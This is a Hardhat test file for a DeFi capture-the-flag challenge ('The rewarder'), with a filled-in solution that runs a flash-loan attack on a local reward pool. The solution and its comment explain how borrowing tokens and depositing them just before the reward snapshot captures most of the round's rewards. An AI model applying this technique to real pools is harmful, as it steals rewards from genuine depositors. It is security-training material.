const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] The rewarder', function () {

    let deployer, alice, bob, charlie, david, attacker;
    let users;

    const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice, bob, charlie, david];

        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);

        this.liquidityToken = await DamnValuableTokenFactory.deploy();
        this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);

        // Set initial token balance of the pool offering flash loans
        await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
        this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
        this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());

        const FlashLoanTheRewarder = await ethers.getContractFactory('FlashLoanTheRewarder', attacker);
        this.attackerContract = await FlashLoanTheRewarder.deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewardToken.address, this.rewarderPool.address, attacker.address);

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (let i = 0; i < users.length; i++) {
            const amount = ethers.utils.parseEther('100');
            await this.liquidityToken.transfer(users[i].address, amount);
            await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
            await this.rewarderPool.connect(users[i]).deposit(amount);
            expect(
                await this.accountingToken.balanceOf(users[i].address)
            ).to.be.eq(amount);
        }
        expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
        expect(await this.rewardToken.totalSupply()).to.be.eq('0');

        // Advance time 5 days so that depositors can get rewards
        const fiveDays = 5 * 24 * 60 * 60;
        await ethers.provider.send("evm_increaseTime", [fiveDays]); // 5 days
        /*
        There are two relevant RPC methods here: evm_increaseTime and evm_setNextBlockTimestamp. 
        In both cases, they affect the next block but don't mine one.
        evm_increaseTime receives a number of seconds that will be added to the timestamp of the latest block.
        evm_setNextBlockTimestamp receives an absolute UNIX timestamp (again, in seconds),
        and so it's not affected by the current block
        refer: https://ethereum.stackexchange.com/questions/86633/time-dependent-tests-with-hardhat
         */
        
        // Each depositor gets 25 reward tokens
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

        // Attacker starts with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
        
        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('2');
    });

    it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE
    There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
    Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
    You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
    Oh, by the way, rumours say a new pool has just landed on mainnet. 
    Isn't it offering DVT tokens in flash loans?

    A large flash loan deposit right at the beginning of the new round,
    but just before the distributeRewards() is triggered which would take the account snapshot. 
    This would allow an attacker to collect the reward and withdraw deposited tokens to return them back to the flash loan pool all in the same transaction.
    */

        console.log("\nRound:",BigInt(await this.rewarderPool.roundNumber()));
        let AttackerReward = ethers.utils.formatEther(await this.rewardToken.balanceOf(attacker.address));
        console.log("RewardToken Balance:",AttackerReward.toString());

        // We simulate waiting just long enough for the next round to start.
        const fiveDays = 5 * 24 * 60 * 60;
        await ethers.provider.send("evm_increaseTime", [fiveDays]); 
        // It need to use evm_increaseTime because account start snapshot to give reward
        // during deposit only beginning of new round (5 days)
        // It force the round-start (snapshot) to be within a different transaction/block
        await this.attackerContract.executeFlashLoanAttack(TOKENS_IN_LENDER_POOL);
       
        console.log("\nRound:",BigInt(await this.rewarderPool.roundNumber()));
        AttackerReward = ethers.utils.formatEther(await this.rewardToken.balanceOf(attacker.address));
        console.log("RewardToken Balance:",AttackerReward.toString());
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Only one round should have taken place
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('3');

        // Users should get neglegible rewards this round
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            let rewards = await this.rewardToken.balanceOf(users[i].address);
            
            // The difference between current and previous rewards balance should be lower than 0.01 tokens
            let delta = rewards.sub(ethers.utils.parseEther('25'));
            expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
        }
        
        // Rewards must have been issued to the attacker account
        expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
        let rewards = await this.rewardToken.balanceOf(attacker.address);

        // The amount of rewards earned should be really close to 100 tokens
        let delta = ethers.utils.parseEther('100').sub(rewards);
        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

        // Attacker finishes with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
    });
});
